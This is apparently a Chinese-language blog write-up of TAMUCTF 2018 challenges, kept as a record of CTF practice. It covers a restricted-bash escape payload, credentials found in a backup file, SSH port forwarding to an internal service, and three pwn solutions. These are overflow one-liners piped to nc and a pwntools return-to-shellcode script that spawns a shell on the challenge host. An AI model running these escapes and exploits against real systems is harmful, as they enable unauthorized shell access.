---
title: TAMUCTF-2018
tags:
    - Write-up
    - tamuctf
lang: zh-tw
cotegories:
    - Write-up
    - tamuctf
    - 2018
---

太多情境題了
web 滿滿的水題有點無言
只寫一些值得紀錄的

## Misc
### you can run, you can hide [25]

```
find the hidden flag.

ssh tamuctf@shell1.ctf.tamu.edu -p 2223
password: tamuctf
```

ssh 進去之後發現他是用`rbash`，意外在網路上找到神奇 payload (到現在還不知道原理)
`BASH_CMDS[a]=/bin/sh;a`
[Source](https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html)

目錄裡面直接就有flag了
`gigem{TAMU_secret_society_qSD358OUYGcezTlFbqeh}`

後面神隊友給了另一個 payload (在看連入的連線的時候發現好像大部分都是這樣連入的)
`ssh tamuctf@shell1.ctf.tamu.edu -p 2223 -t "bash --noprofile"`

### enum [150]

```
Find the hidden flag.
You do not need to bruteforce. Don't do it.

ssh tamuctf@shell2.ctf.tamu.edu -p 2222
password: tamuctf
```

這題卡很久，最後靠隊友 carry
連續前面一題，繞過之後我一開始在`/var/backups/`找到`.srv.bak`，裡面放了帳號跟密碼
後來就是隊友carry的部分了
用`ps aux`指令發現有一個程序是執行`/bin/bash -c /usr/sbin/service ssh restart && cd /.administrators && /usr/bin/python /.administrators/pyserver.py 9000`
後來在自己的電腦執行`ssh -L 1234:localhost:9000 tamuctf@shell2.ctf.tamu.edu -p 2222`(port forwarding)，在自己的瀏覽器開啟`localhost:1234`再輸入之前找到的帳號密碼就可以得到 flag 了
`gigem{pivot_piv0t_P1V0T_20975430987aff92qf89qf}`

## Pwn
### Pwn1
只是覆蓋`cmp    DWORD PTR [ebp-0xc],0xf007ba11`而已

Payload:
```
python -c "print 'a'*23 + '\x11\xba\x07\xf0'" | nc pwn.ctf.tamu.edu 4321
```

### Pwn2
執行`echo`函式時，可以 Overflow 跳到`print_flag`

Payload:
```
python -c "print 'a'*243 + '\x4b\x85\x04\x08'" | nc pwn.ctf.tamu.edu 4322
```

### Pwn3
觀察了一下會發現輸出的 random number 會是 buffer 的起始地址，所以方向就很清楚了 `return to shellcode`

Payload:
{% codeblock lang:python %}
#!/usr/bin/env python

from pwn import *

#r = process('./pwn3')
#r = remote('0.0.0.0', 8888)
r = remote('pwn.ctf.tamu.edu', 4323)
context.log_level = 'debug'
context.arch = 'i386'

r.recvuntil('Your random number ')
addr = int(r.recv(10).strip(), 16)

shellcode = asm(shellcraft.i386.linux.sh())

payload = shellcode + 'a' * (242-len(shellcode)) + p32(addr)

print hex(addr)
print p32(addr)
print payload

r.recvuntil('?')
#raw_input('########')
r.sendline(payload)
r.interactive()
{% endcodeblock %}

